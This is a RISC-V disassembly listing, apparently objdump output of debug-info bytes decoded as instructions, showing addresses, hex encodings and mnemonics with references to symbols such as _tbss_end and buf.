    14b6:	0952                	slli	s2,s2,0x14
    14b8:	0000                	unimp
    14ba:	0538                	addi	a4,sp,648
    14bc:	1200                	addi	s0,sp,288
    14be:	1a08                	addi	a0,sp,304
    14c0:	0006                	c.slli	zero,0x1
    14c2:	0200                	addi	s0,sp,256
    14c4:	0801                	addi	a6,a6,0
    14c6:	03e4                	addi	s1,sp,460
    14c8:	0000                	unimp
    14ca:	1a05                	addi	s4,s4,-31
    14cc:	0006                	c.slli	zero,0x1
    14ce:	1200                	addi	s0,sp,288
    14d0:	a208                	fsd	fa0,0(a2)
    14d2:	0004                	0x4
    14d4:	1600                	addi	s0,sp,800
    14d6:	00ed                	addi	ra,ra,27
    14d8:	0000                	unimp
    14da:	064a                	slli	a2,a2,0x12
    14dc:	0000                	unimp
    14de:	0004c017          	auipc	zero,0x4c
    14e2:	1700                	addi	s0,sp,928
    14e4:	0000015b          	0x15b
    14e8:	00064a17          	auipc	s4,0x64
    14ec:	1700                	addi	s0,sp,928
    14ee:	0049                	c.nop	18
    14f0:	0000                	unimp
    14f2:	1200                	addi	s0,sp,288
    14f4:	2108                	fld	fa0,0(a0)
    14f6:	0006                	c.slli	zero,0x1
    14f8:	1200                	addi	s0,sp,288
    14fa:	2c08                	fld	fa0,24(s0)
    14fc:	0006                	c.slli	zero,0x1
    14fe:	1600                	addi	s0,sp,800
    1500:	00e1                	addi	ra,ra,24
    1502:	0000                	unimp
    1504:	0674                	addi	a3,sp,780
    1506:	0000                	unimp
    1508:	0004c017          	auipc	zero,0x4c
    150c:	1700                	addi	s0,sp,928
    150e:	0000015b          	0x15b
    1512:	0000e117          	auipc	sp,0xe
    1516:	1700                	addi	s0,sp,928
    1518:	0049                	c.nop	18
    151a:	0000                	unimp
    151c:	1200                	addi	s0,sp,288
    151e:	5608                	lw	a0,40(a2)
    1520:	0006                	c.slli	zero,0x1
    1522:	1600                	addi	s0,sp,800
    1524:	0049                	c.nop	18
    1526:	0000                	unimp
    1528:	068e                	slli	a3,a3,0x3
    152a:	0000                	unimp
    152c:	0004c017          	auipc	zero,0x4c
    1530:	1700                	addi	s0,sp,928
    1532:	0000015b          	0x15b
    1536:	1200                	addi	s0,sp,288
    1538:	7a08                	ld	a0,48(a2)
    153a:	0006                	c.slli	zero,0x1
    153c:	0a00                	addi	s0,sp,272
    153e:	0034                	addi	a3,sp,8
    1540:	0000                	unimp
    1542:	06a4                	addi	s1,sp,840
    1544:	0000                	unimp
    1546:	0000790b          	0x790b
    154a:	0200                	addi	s0,sp,256
    154c:	0a00                	addi	s0,sp,272
    154e:	0034                	addi	a3,sp,8
    1550:	0000                	unimp
    1552:	06b4                	addi	a3,sp,840
    1554:	0000                	unimp
    1556:	0000790b          	0x790b
    155a:	0000                	unimp
    155c:	0700                	addi	s0,sp,896
    155e:	0421                	addi	s0,s0,8
    1560:	0000                	unimp
    1562:	2408                	fld	fa0,8(s0)
    1564:	1a01                	addi	s4,s4,-32
    1566:	035f 0000 811b      	0x811b0000035f
    156c:	0005                	c.nop	1
    156e:	1800                	addi	s0,sp,48
    1570:	2808                	fld	fa0,16(s0)
    1572:	0801                	addi	a6,a6,0
    1574:	06fa                	slli	a3,a3,0x1e
    1576:	0000                	unimp
    1578:	4919                	li	s2,6
    157a:	0004                	0x4
    157c:	0800                	addi	s0,sp,16
    157e:	012a                	slli	sp,sp,0xa
    1580:	fa11                	bnez	a2,1494 <_tbss_end+0x1410>
    1582:	0006                	c.slli	zero,0x1
    1584:	0000                	unimp
    1586:	9d19                	subw	a0,a0,a4
    1588:	0002                	c.slli64	zero
    158a:	0800                	addi	s0,sp,16
    158c:	4907012b          	0x4907012b
    1590:	0000                	unimp
    1592:	0800                	addi	s0,sp,16
    1594:	1b19                	addi	s6,s6,-26
    1596:	0004                	0x4
    1598:	0800                	addi	s0,sp,16
    159a:	012c                	addi	a1,sp,136
    159c:	0007000b          	0x7000b
    15a0:	1000                	addi	s0,sp,32
    15a2:	1200                	addi	s0,sp,288
    15a4:	c108                	sw	a0,0(a0)
    15a6:	0006                	c.slli	zero,0x1
    15a8:	1200                	addi	s0,sp,288
    15aa:	b408                	fsd	fa0,40(s0)
    15ac:	0006                	c.slli	zero,0x1
    15ae:	1b00                	addi	s0,sp,432
    15b0:	0022                	c.slli	zero,0x8
    15b2:	0000                	unimp
    15b4:	080e                	slli	a6,a6,0x3
    15b6:	0144                	addi	s1,sp,132
    15b8:	3f08                	fld	fa0,56(a4)
    15ba:	19000007          	0x19000007
    15be:	04a0                	addi	s0,sp,584
    15c0:	0000                	unimp
    15c2:	4508                	lw	a0,8(a0)
    15c4:	1201                	addi	tp,tp,-32
    15c6:	0000073f 04de1900 	0x4de19000000073f
    15ce:	0000                	unimp
    15d0:	4608                	lw	a0,8(a2)
    15d2:	1201                	addi	tp,tp,-32
    15d4:	0000073f 04ff1906 	0x4ff19060000073f
    15dc:	0000                	unimp
    15de:	4708                	lw	a0,8(a4)
    15e0:	1201                	addi	tp,tp,-32
    15e2:	0042                	c.slli	zero,0x10
    15e4:	0000                	unimp
    15e6:	000c                	0xc
    15e8:	420a                	lw	tp,128(sp)
    15ea:	0000                	unimp
    15ec:	4f00                	lw	s0,24(a4)
    15ee:	0b000007          	0xb000007
    15f2:	0079                	c.nop	30
    15f4:	0000                	unimp
    15f6:	0002                	c.slli64	zero
    15f8:	d81c                	sw	a5,48(s0)
    15fa:	8508                	0x8508
    15fc:	0702                	c.slli64	a4
    15fe:	0864                	addi	s1,sp,28
    1600:	0000                	unimp
    1602:	3719                	addiw	a4,a4,-26
    1604:	0005                	c.nop	1
    1606:	0800                	addi	s0,sp,16
    1608:	5f180287          	0x5f180287
    160c:	0000                	unimp
    160e:	0000                	unimp
    1610:	e419                	bnez	s0,161e <_tbss_end+0x159a>
    1612:	0004                	0x4
    1614:	0800                	addi	s0,sp,16
    1616:	0288                	addi	a0,sp,320
    1618:	1412                	slli	s0,s0,0x24
    161a:	0006                	c.slli	zero,0x1
    161c:	0800                	addi	s0,sp,16
    161e:	d719                	beqz	a4,152c <_tbss_end+0x14a8>
    1620:	0002                	c.slli64	zero
    1622:	0800                	addi	s0,sp,16
    1624:	0289                	addi	t0,t0,2
    1626:	6410                	ld	a2,8(s0)
    1628:	0008                	0x8
    162a:	1000                	addi	s0,sp,32
    162c:	bd19                	j	1442 <_tbss_end+0x13be>
    162e:	0005                	c.nop	1
    1630:	0800                	addi	s0,sp,16
    1632:	028a                	slli	t0,t0,0x2
    1634:	0001f717          	auipc	a4,0x1f
    1638:	2c00                	fld	fs0,24(s0)
    163a:	4219                	li	tp,6
    163c:	0002                	c.slli64	zero
    163e:	0800                	addi	s0,sp,16
    1640:	490f028b          	0x490f028b
    1644:	0000                	unimp
    1646:	5000                	lw	s0,32(s0)
    1648:	4419                	li	s0,6
    164a:	0004                	0x4
    164c:	0800                	addi	s0,sp,16
    164e:	028c                	addi	a1,sp,320
    1650:	742c                	ld	a1,104(s0)
    1652:	0008                	0x8
    1654:	5800                	lw	s0,48(s0)
    1656:	d319                	beqz	a4,155c <_tbss_end+0x14d8>
    1658:	0005                	c.nop	1
    165a:	0800                	addi	s0,sp,16
    165c:	028d                	addi	t0,t0,3
    165e:	061a                	slli	a2,a2,0x6
    1660:	60000007          	0x60000007
    1664:	4f19                	li	t5,6
    1666:	0004                	0x4
    1668:	0800                	addi	s0,sp,16
    166a:	028e                	slli	t0,t0,0x3
    166c:	4f16                	lw	t5,68(sp)
    166e:	0001                	nop
    1670:	7000                	ld	s0,32(s0)
    1672:	de19                	beqz	a2,1590 <_tbss_end+0x150c>
    1674:	0005                	c.nop	1
    1676:	0800                	addi	s0,sp,16
    1678:	4f16028f          	0x4f16028f
    167c:	0001                	nop
    167e:	7800                	ld	s0,48(s0)
    1680:	cd19                	beqz	a0,169e <_tbss_end+0x161a>
    1682:	0000                	unimp
    1684:	0800                	addi	s0,sp,16
    1686:	0290                	addi	a2,sp,320
    1688:	4f16                	lw	t5,68(sp)
    168a:	0001                	nop
    168c:	8000                	0x8000
    168e:	9019                	srli	s0,s0,0x26
    1690:	0005                	c.nop	1
    1692:	0800                	addi	s0,sp,16
    1694:	0291                	addi	t0,t0,4
    1696:	7b10                	ld	a2,48(a4)
    1698:	0008                	0x8
    169a:	8800                	0x8800
    169c:	cb19                	beqz	a4,16b2 <_tbss_end+0x162e>
    169e:	0002                	c.slli64	zero
    16a0:	0800                	addi	s0,sp,16
    16a2:	0292                	slli	t0,t0,0x4
    16a4:	8b10                	0x8b10
    16a6:	0008                	0x8
    16a8:	9000                	0x9000
    16aa:	0c19                	addi	s8,s8,6
    16ac:	0005                	c.nop	1
    16ae:	0800                	addi	s0,sp,16
    16b0:	490f0293          	addi	t0,t5,1168
    16b4:	0000                	unimp
    16b6:	a800                	fsd	fs0,16(s0)
    16b8:	0219                	addi	tp,tp,6
    16ba:	0002                	c.slli64	zero
    16bc:	0800                	addi	s0,sp,16
    16be:	0294                	addi	a3,sp,320
    16c0:	4f16                	lw	t5,68(sp)
    16c2:	0001                	nop
    16c4:	ac00                	fsd	fs0,24(s0)
    16c6:	b619                	j	11cc <_tbss_end+0x1148>
    16c8:	0000                	unimp
    16ca:	0800                	addi	s0,sp,16
    16cc:	0295                	addi	t0,t0,5
    16ce:	4f16                	lw	t5,68(sp)
    16d0:	0001                	nop
    16d2:	b400                	fsd	fs0,40(s0)
    16d4:	f119                	bnez	a0,15da <_tbss_end+0x1556>
    16d6:	0001                	nop
    16d8:	0800                	addi	s0,sp,16
    16da:	0296                	slli	t0,t0,0x5
    16dc:	4f16                	lw	t5,68(sp)
    16de:	0001                	nop
    16e0:	bc00                	fsd	fs0,56(s0)
    16e2:	5319                	li	t1,-26
    16e4:	0000                	unimp
    16e6:	0800                	addi	s0,sp,16
    16e8:	4f160297          	auipc	t0,0x4f160
    16ec:	0001                	nop
    16ee:	c400                	sw	s0,8(s0)
    16f0:	6219                	lui	tp,0x6
    16f2:	0000                	unimp
    16f4:	0800                	addi	s0,sp,16
    16f6:	0298                	addi	a4,sp,320
    16f8:	4f16                	lw	t5,68(sp)
    16fa:	0001                	nop
    16fc:	cc00                	sw	s0,24(s0)
    16fe:	f719                	bnez	a4,160c <_tbss_end+0x1588>
    1700:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1704:	0299                	addi	t0,t0,6
    1706:	4908                	lw	a0,16(a0)
    1708:	0000                	unimp
    170a:	d400                	sw	s0,40(s0)
    170c:	0a00                	addi	s0,sp,272
    170e:	061a                	slli	a2,a2,0x6
    1710:	0000                	unimp
    1712:	0874                	addi	a3,sp,28
    1714:	0000                	unimp
    1716:	0000790b          	0x790b
    171a:	1900                	addi	s0,sp,176
    171c:	0200                	addi	s0,sp,256
    171e:	0708                	addi	a0,sp,896
    1720:	00000073          	ecall
    1724:	1a0a                	slli	s4,s4,0x22
    1726:	0006                	c.slli	zero,0x1
    1728:	8b00                	0x8b00
    172a:	0008                	0x8
    172c:	0b00                	addi	s0,sp,400
    172e:	0079                	c.nop	30
    1730:	0000                	unimp
    1732:	1a0a0007          	0x1a0a0007
    1736:	0006                	c.slli	zero,0x1
    1738:	9b00                	0x9b00
    173a:	0008                	0x8
    173c:	0b00                	addi	s0,sp,400
    173e:	0079                	c.nop	30
    1740:	0000                	unimp
    1742:	681d0017          	auipc	zero,0x681d0
    1746:	0801                	addi	a6,a6,0
    1748:	029e                	slli	t0,t0,0x7
    174a:	0008c307          	flq	ft6,0(a7) # 4000 <_tbss_end+0x3f7c>
    174e:	1900                	addi	s0,sp,176
    1750:	0351                	addi	t1,t1,20
    1752:	0000                	unimp
    1754:	a108                	fsd	fa0,0(a0)
    1756:	1b02                	slli	s6,s6,0x20
    1758:	000008c3          	fmadd.s	fa7,ft0,ft0,ft0,rne
    175c:	1900                	addi	s0,sp,176
    175e:	0332                	slli	t1,t1,0xc
    1760:	0000                	unimp
    1762:	a208                	fsd	fa0,0(a2)
    1764:	1802                	slli	a6,a6,0x20
    1766:	000008d3          	fadd.s	fa7,ft0,ft0,rne
    176a:	00f0                	addi	a2,sp,76
    176c:	590a                	lw	s2,160(sp)
    176e:	d3000003          	lb	zero,-720(zero) # fffffffffffffd30 <_end+0xffffffff7ffe4870>
    1772:	0008                	0x8
    1774:	0b00                	addi	s0,sp,400
    1776:	0079                	c.nop	30
    1778:	0000                	unimp
    177a:	001d                	c.nop	7
    177c:	5f0a                	lw	t5,160(sp)
    177e:	0000                	unimp
    1780:	e300                	sd	s0,0(a4)
    1782:	0008                	0x8
    1784:	0b00                	addi	s0,sp,400
    1786:	0079                	c.nop	30
    1788:	0000                	unimp
    178a:	001d                	c.nop	7
    178c:	681e                	ld	a6,448(sp)
    178e:	0801                	addi	a6,a6,0
    1790:	09030283          	lb	t0,144(t1)
    1794:	0009                	c.nop	2
    1796:	1f00                	addi	s0,sp,944
    1798:	0499                	addi	s1,s1,6
    179a:	0000                	unimp
    179c:	9a08                	0x9a08
    179e:	0b02                	c.slli64	s6
    17a0:	0000074f          	fnmadd.s	fa4,ft0,ft0,ft0,rne
    17a4:	aa1f 0005 0800      	0x8000005aa1f
    17aa:	9b0b02a3          	sb	a6,-1627(s6) # 4909a5 <_tbss_end+0x490921>
    17ae:	0008                	0x8
    17b0:	0000                	unimp
    17b2:	1a0a                	slli	s4,s4,0x22
    17b4:	0006                	c.slli	zero,0x1
    17b6:	1900                	addi	s0,sp,176
    17b8:	0009                	c.nop	2
    17ba:	0b00                	addi	s0,sp,400
    17bc:	0079                	c.nop	30
    17be:	0000                	unimp
    17c0:	0018                	0x18
    17c2:	a220                	fsd	fs0,64(a2)
    17c4:	0000                	unimp
    17c6:	1200                	addi	s0,sp,288
    17c8:	1908                	addi	a0,sp,176
    17ca:	0009                	c.nop	2
    17cc:	2100                	fld	fs0,0(a0)
    17ce:	0000092f          	0x92f
    17d2:	0004c017          	auipc	zero,0x4c
    17d6:	0000                	unimp
    17d8:	0812                	slli	a6,a6,0x4
    17da:	0924                	addi	s1,sp,152
    17dc:	0000                	unimp
    17de:	0812                	slli	a6,a6,0x4
    17e0:	01e1                	addi	gp,gp,24
    17e2:	0000                	unimp
    17e4:	4621                	li	a2,8
    17e6:	0009                	c.nop	2
    17e8:	1700                	addi	s0,sp,928
    17ea:	0049                	c.nop	18
    17ec:	0000                	unimp
    17ee:	1200                	addi	s0,sp,288
    17f0:	4c08                	lw	a0,24(s0)
    17f2:	0009                	c.nop	2
    17f4:	1200                	addi	s0,sp,288
    17f6:	3b08                	fld	fa0,48(a4)
    17f8:	0009                	c.nop	2
    17fa:	0a00                	addi	s0,sp,272
    17fc:	06b4                	addi	a3,sp,840
    17fe:	0000                	unimp
    1800:	0962                	slli	s2,s2,0x18
    1802:	0000                	unimp
    1804:	0000790b          	0x790b
    1808:	0200                	addi	s0,sp,256
    180a:	2200                	fld	fs0,0(a2)
    180c:	0520                	addi	s0,sp,648
    180e:	0000                	unimp
    1810:	3308                	fld	fa0,32(a4)
    1812:	04c01703          	lh	a4,76(zero) # 4c <buf.2990+0xc>
    1816:	0000                	unimp
    1818:	1922                	slli	s2,s2,0x28
    181a:	0005                	c.nop	1
    181c:	0800                	addi	s0,sp,16
    181e:	0334                	addi	a3,sp,392
    1820:	c61d                	beqz	a2,184e <_tbss_end+0x17ca>
    1822:	0004                	0x4
    1824:	0600                	addi	s0,sp,768
    1826:	000006e7          	jalr	a3,zero # 0 <_tdata_begin>
    182a:	280a                	fld	fa6,128(sp)
    182c:	00015d1b          	srliw	s10,sp,0x0
    1830:	0600                	addi	s0,sp,768
    1832:	06ee                	slli	a3,a3,0x1b
    1834:	0000                	unimp
    1836:	630a                	ld	t1,128(sp)
    1838:	7c18                	ld	a4,56(s0)
    183a:	0009                	c.nop	2
    183c:	2300                	fld	fs0,0(a4)
    183e:	0829                	addi	a6,a6,10
    1840:	0000                	unimp
    1842:	0f02                	c.slli64	t5
    1844:	981a                	add	a6,a6,t1
    1846:	0000                	unimp
    1848:	2300                	fld	fs0,0(a4)
    184a:	087d                	addi	a6,a6,31
    184c:	0000                	unimp
    184e:	1002                	c.slli	zero,0x20
    1850:	981a                	add	a6,a6,t1
    1852:	0000                	unimp
    1854:	0a00                	addi	s0,sp,272
    1856:	009d                	addi	ra,ra,7
    1858:	0000                	unimp
    185a:	09bc                	addi	a5,sp,216
    185c:	0000                	unimp
    185e:	0000790b          	0x790b
    1862:	0100                	addi	s0,sp,128
    1864:	2400                	fld	fs0,8(s0)
    1866:	0715                	addi	a4,a4,5
    1868:	0000                	unimp
    186a:	2502                	fld	fa0,0(sp)
    186c:	ac12                	fsd	ft4,24(sp)
    186e:	0009                	c.nop	2
    1870:	0900                	addi	s0,sp,144
    1872:	01b48003          	lb	zero,27(s1)
    1876:	0080                	addi	s0,sp,64
    1878:	0000                	unimp
    187a:	0a00                	addi	s0,sp,272
    187c:	0614                	addi	a3,sp,768
    187e:	0000                	unimp
    1880:	09e2                	slli	s3,s3,0x18
    1882:	0000                	unimp
    1884:	0000790b          	0x790b
    1888:	0100                	addi	s0,sp,128
    188a:	2400                	fld	fs0,8(s0)
    188c:	080c                	addi	a1,sp,16
    188e:	0000                	unimp
    1890:	2602                	fld	fa2,0(sp)
    1892:	d20e                	sw	gp,36(sp)
    1894:	0009                	c.nop	2
    1896:	0900                	addi	s0,sp,144
    1898:	01b49003          	lh	zero,27(s1)
    189c:	0080                	addi	s0,sp,64
    189e:	0000                	unimp
    18a0:	2500                	fld	fs0,8(a0)
    18a2:	089f 0000 c302      	0xc3020000089f
    18a8:	0601                	addi	a2,a2,0
    18aa:	0066                	c.slli	zero,0x19
    18ac:	0000                	unimp
    18ae:	2736                	fld	fa4,328(sp)
    18b0:	8000                	0x8000
    18b2:	0000                	unimp
    18b4:	0000                	unimp
    18b6:	00dc                	addi	a5,sp,68
    18b8:	0000                	unimp
    18ba:	0000                	unimp
    18bc:	0000                	unimp
    18be:	9c01                	subw	s0,s0,s0
    18c0:	0a4c                	addi	a1,sp,276
    18c2:	0000                	unimp
    18c4:	7326                	ld	t1,104(sp)
    18c6:	7274                	ld	a3,224(a2)
    18c8:	0200                	addi	s0,sp,256
    18ca:	4a1701c3          	fmadd.d	ft3,fa4,ft1,fs1,rne
    18ce:	0006                	c.slli	zero,0x1
    18d0:	0200                	addi	s0,sp,256
    18d2:	5891                	li	a7,-28
    18d4:	73657227          	0x73657227
    18d8:	0200                	addi	s0,sp,256
    18da:	01c5                	addi	gp,gp,17
    18dc:	6608                	ld	a0,8(a2)
    18de:	0000                	unimp
    18e0:	0200                	addi	s0,sp,256
    18e2:	6891                	lui	a7,0x4
    18e4:	1e28                	addi	a0,sp,824
    18e6:	0002                	c.slli64	zero
    18e8:	0200                	addi	s0,sp,256
    18ea:	01c6                	slli	gp,gp,0x11
    18ec:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    18f0:	0200                	addi	s0,sp,256
    18f2:	6491                	lui	s1,0x4
    18f4:	2900                	fld	fs0,16(a0)
    18f6:	06ca                	slli	a3,a3,0x12
    18f8:	0000                	unimp
    18fa:	1408260b          	0x1408260b
    18fe:	0006                	c.slli	zero,0x1
    1900:	ec00                	sd	s0,24(s0)
    1902:	0026                	c.slli	zero,0x9
    1904:	0080                	addi	s0,sp,64
    1906:	0000                	unimp
    1908:	4a00                	lw	s0,16(a2)
    190a:	0000                	unimp
    190c:	0000                	unimp
    190e:	0000                	unimp
    1910:	0100                	addi	s0,sp,128
    1912:	9d9c                	0x9d9c
    1914:	000a                	c.slli	zero,0x2
    1916:	2a00                	fld	fs0,16(a2)
    1918:	08bd                	addi	a7,a7,15
    191a:	0000                	unimp
    191c:	bb02                	fsd	ft0,432(sp)
    191e:	1401                	addi	s0,s0,-32
    1920:	0614                	addi	a3,sp,768
    1922:	0000                	unimp
    1924:	9102                	jalr	sp
    1926:	2658                	fld	fa4,136(a2)
    1928:	00637273          	csrrci	tp,0x6,6
    192c:	bb02                	fsd	ft0,432(sp)
    192e:	2601                	sext.w	a2,a2
    1930:	064a                	slli	a2,a2,0x12
    1932:	0000                	unimp
    1934:	9102                	jalr	sp
    1936:	2750                	fld	fa2,136(a4)
    1938:	0064                	addi	s1,sp,12
    193a:	bd02                	fsd	ft0,184(sp)
    193c:	0901                	addi	s2,s2,0
    193e:	0614                	addi	a3,sp,768
    1940:	0000                	unimp
    1942:	9102                	jalr	sp
    1944:	0068                	addi	a0,sp,12
    1946:	4129                	li	sp,10
    1948:	0b000007          	0xb000007
    194c:	0624                	addi	s1,sp,776
    194e:	0049                	c.nop	18
    1950:	0000                	unimp
    1952:	267c                	fld	fa5,200(a2)
    1954:	8000                	0x8000
    1956:	0000                	unimp
    1958:	0000                	unimp
    195a:	0070                	addi	a2,sp,12
    195c:	0000                	unimp
    195e:	0000                	unimp
    1960:	0000                	unimp
    1962:	9c01                	subw	s0,s0,s0
    1964:	0afc                	addi	a5,sp,348
    1966:	0000                	unimp
    1968:	7326                	ld	t1,104(sp)
    196a:	0031                	c.nop	12
    196c:	af02                	fsd	ft0,408(sp)
    196e:	1801                	addi	a6,a6,-32
    1970:	064a                	slli	a2,a2,0x12
    1972:	0000                	unimp
    1974:	9102                	jalr	sp
    1976:	2658                	fld	fa4,136(a2)
    1978:	02003273          	csrrc	tp,0x20,zero
    197c:	4a2801af          	0x4a2801af
    1980:	0006                	c.slli	zero,0x1
    1982:	0200                	addi	s0,sp,256
    1984:	5091                	li	ra,-28
    1986:	00316327          	0x316327
    198a:	b102                	fsd	ft0,160(sp)
    198c:	1101                	addi	sp,sp,-32
    198e:	0034                	addi	a3,sp,8
    1990:	0000                	unimp
    1992:	9102                	jalr	sp
    1994:	3263276f          	jal	a4,33cba <_tbss_end+0x33c36>
    1998:	0200                	addi	s0,sp,256
    199a:	01b1                	addi	gp,gp,12
    199c:	3415                	addiw	s0,s0,-27
    199e:	0000                	unimp
    19a0:	0200                	addi	s0,sp,256
    19a2:	6e91                	lui	t4,0x4
    19a4:	2900                	fld	fs0,16(a0)
    19a6:	0000065b          	0x65b
    19aa:	ae09770b          	0xae09770b
    19ae:	0000                	unimp
    19b0:	2e00                	fld	fs0,24(a2)
    19b2:	0026                	c.slli	zero,0x9
    19b4:	0080                	addi	s0,sp,64
    19b6:	0000                	unimp
    19b8:	4e00                	lw	s0,24(a2)
    19ba:	0000                	unimp
    19bc:	0000                	unimp
    19be:	0000                	unimp
    19c0:	0100                	addi	s0,sp,128
    19c2:	499c                	lw	a5,16(a1)
    19c4:	2600000b          	0x2600000b
    19c8:	a7020073          	0xa7020073
    19cc:	1c01                	addi	s8,s8,-32
    19ce:	064a                	slli	a2,a2,0x12
    19d0:	0000                	unimp
    19d2:	9102                	jalr	sp
    19d4:	2658                	fld	fa4,136(a2)
    19d6:	006e                	c.slli	zero,0x1b
    19d8:	a702                	fsd	ft0,392(sp)
    19da:	2601                	sext.w	a2,a2
    19dc:	00ae                	slli	ra,ra,0xb
    19de:	0000                	unimp
    19e0:	9102                	jalr	sp
    19e2:	2750                	fld	fa2,136(a4)
    19e4:	0070                	addi	a2,sp,12
    19e6:	a902                	fsd	ft0,144(sp)
    19e8:	0f01                	addi	t5,t5,0
    19ea:	064a                	slli	a2,a2,0x12
    19ec:	0000                	unimp
    19ee:	9102                	jalr	sp
    19f0:	0068                	addi	a0,sp,12
    19f2:	4329                	li	t1,10
    19f4:	0006                	c.slli	zero,0x1
    19f6:	0b00                	addi	s0,sp,400
    19f8:	0929                	addi	s2,s2,10
    19fa:	00ae                	slli	ra,ra,0xb
    19fc:	0000                	unimp
    19fe:	25f2                	fld	fa1,280(sp)
    1a00:	8000                	0x8000
    1a02:	0000                	unimp
    1a04:	0000                	unimp
    1a06:	003c                	addi	a5,sp,8
    1a08:	0000                	unimp
    1a0a:	0000                	unimp
    1a0c:	0000                	unimp
    1a0e:	9c01                	subw	s0,s0,s0
    1a10:	0b88                	addi	a0,sp,464
    1a12:	0000                	unimp
    1a14:	7326                	ld	t1,104(sp)
    1a16:	0200                	addi	s0,sp,256
    1a18:	019f 4a1b 0006      	0x64a1b019f
    1a1e:	0200                	addi	s0,sp,256
    1a20:	5891                	li	a7,-28
    1a22:	02007027          	0x2007027
    1a26:	01a1                	addi	gp,gp,8
    1a28:	00064a0f          	0x64a0f
    1a2c:	0200                	addi	s0,sp,256
    1a2e:	6891                	lui	a7,0x4
    1a30:	2900                	fld	fs0,16(a0)
    1a32:	0764                	addi	s1,sp,908
    1a34:	0000                	unimp
    1a36:	5b09210b          	0x5b09210b
    1a3a:	0001                	nop
    1a3c:	2400                	fld	fs0,8(s0)
    1a3e:	0025                	c.nop	9
    1a40:	0080                	addi	s0,sp,64
    1a42:	0000                	unimp
    1a44:	ce00                	sw	s0,24(a2)
    1a46:	0000                	unimp
    1a48:	0000                	unimp
    1a4a:	0000                	unimp
    1a4c:	0100                	addi	s0,sp,128
    1a4e:	309c                	fld	fa5,32(s1)
    1a50:	000c                	0xc
    1a52:	2a00                	fld	fs0,16(a2)
    1a54:	08bd                	addi	a7,a7,15
    1a56:	0000                	unimp
    1a58:	8c02                	jr	s8
    1a5a:	1401                	addi	s0,s0,-32
    1a5c:	0000015b          	0x15b
    1a60:	9102                	jalr	sp
    1a62:	2a48                	fld	fa0,144(a2)
    1a64:	00000843          	fmadd.s	fa6,ft0,ft0,ft0,rne
    1a68:	8c02                	jr	s8
    1a6a:	1e01                	addi	t3,t3,-32
    1a6c:	0049                	c.nop	18
    1a6e:	0000                	unimp
    1a70:	9102                	jalr	sp
    1a72:	2644                	fld	fs1,136(a2)
    1a74:	656c                	ld	a1,200(a0)
    1a76:	006e                	c.slli	zero,0x1b
    1a78:	8c02                	jr	s8
    1a7a:	2b01                	sext.w	s6,s6
    1a7c:	00ae                	slli	ra,ra,0xb
    1a7e:	0000                	unimp
    1a80:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    1a84:	0025462b          	0x25462b
    1a88:	0080                	addi	s0,sp,64
    1a8a:	0000                	unimp
    1a8c:	6c00                	ld	s0,24(s0)
    1a8e:	0000                	unimp
    1a90:	0000                	unimp
    1a92:	0000                	unimp
    1a94:	0f00                	addi	s0,sp,912
    1a96:	000c                	0xc
    1a98:	2800                	fld	fs0,16(s0)
    1a9a:	081a                	slli	a6,a6,0x6
    1a9c:	0000                	unimp
    1a9e:	8f02                	jr	t5
    1aa0:	0f01                	addi	t5,t5,0
    1aa2:	009d                	addi	ra,ra,7
    1aa4:	0000                	unimp
    1aa6:	9102                	jalr	sp
    1aa8:	2758                	fld	fa4,136(a4)
    1aaa:	0064                	addi	s1,sp,12
    1aac:	9402                	jalr	s0
    1aae:	1001                	c.nop	-32
    1ab0:	0c30                	addi	a2,sp,536
    1ab2:	0000                	unimp
    1ab4:	9102                	jalr	sp
    1ab6:	0068                	addi	a0,sp,12
    1ab8:	b22c                	fsd	fa1,96(a2)
    1aba:	0025                	c.nop	9
    1abc:	0080                	addi	s0,sp,64
    1abe:	0000                	unimp
    1ac0:	3400                	fld	fs0,40(s0)
    1ac2:	0000                	unimp
    1ac4:	0000                	unimp
    1ac6:	0000                	unimp
    1ac8:	2700                	fld	fs0,8(a4)
    1aca:	0064                	addi	s1,sp,12
    1acc:	9802                	jalr	a6
    1ace:	0b01                	addi	s6,s6,0
    1ad0:	0614                	addi	a3,sp,768
    1ad2:	0000                	unimp
    1ad4:	9102                	jalr	sp
    1ad6:	0060                	addi	s0,sp,12
    1ad8:	1200                	addi	s0,sp,288
    1ada:	9d08                	0x9d08
    1adc:	0000                	unimp
    1ade:	2900                	fld	fs0,16(a0)
    1ae0:	0886                	slli	a7,a7,0x1
    1ae2:	0000                	unimp
    1ae4:	5b091f0b          	0x5b091f0b
    1ae8:	0001                	nop
    1aea:	6c00                	ld	s0,24(s0)
    1aec:	0024                	addi	s1,sp,8
    1aee:	0080                	addi	s0,sp,64
    1af0:	0000                	unimp
    1af2:	b800                	fsd	fs0,48(s0)
    1af4:	0000                	unimp
    1af6:	0000                	unimp
    1af8:	0000                	unimp
    1afa:	0100                	addi	s0,sp,128
    1afc:	ea9c                	sd	a5,16(a3)
    1afe:	000c                	0xc
    1b00:	2a00                	fld	fs0,16(a2)
    1b02:	08bd                	addi	a7,a7,15
    1b04:	0000                	unimp
    1b06:	7c02                	ld	s8,32(sp)
    1b08:	1401                	addi	s0,s0,-32
    1b0a:	0000015b          	0x15b
    1b0e:	9102                	jalr	sp
    1b10:	2648                	fld	fa0,136(a2)
    1b12:	00637273          	csrrci	tp,0x6,6
    1b16:	7c02                	ld	s8,32(sp)
    1b18:	2601                	sext.w	a2,a2
    1b1a:	0cea                	slli	s9,s9,0x1a
    1b1c:	0000                	unimp
    1b1e:	9102                	jalr	sp
    1b20:	2640                	fld	fs0,136(a2)
    1b22:	656c                	ld	a1,200(a0)
    1b24:	006e                	c.slli	zero,0x1b
    1b26:	7c02                	ld	s8,32(sp)
    1b28:	3201                	addiw	tp,tp,-32
    1b2a:	00ae                	slli	ra,ra,0xb
    1b2c:	0000                	unimp
    1b2e:	7fb89103          	lh	sp,2043(a7)
    1b32:	0024922b          	0x24922b
    1b36:	0080                	addi	s0,sp,64
    1b38:	0000                	unimp
    1b3a:	4200                	lw	s0,0(a2)
    1b3c:	0000                	unimp
    1b3e:	0000                	unimp
    1b40:	0000                	unimp
    1b42:	bb00                	fsd	fs0,48(a4)
    1b44:	000c                	0xc
    1b46:	2700                	fld	fs0,8(a4)
    1b48:	7f020073          	0x7f020073
    1b4c:	1601                	addi	a2,a2,-32
    1b4e:	0cf1                	addi	s9,s9,28
    1b50:	0000                	unimp
    1b52:	9102                	jalr	sp
    1b54:	2768                	fld	fa0,200(a4)
    1b56:	0064                	addi	s1,sp,12
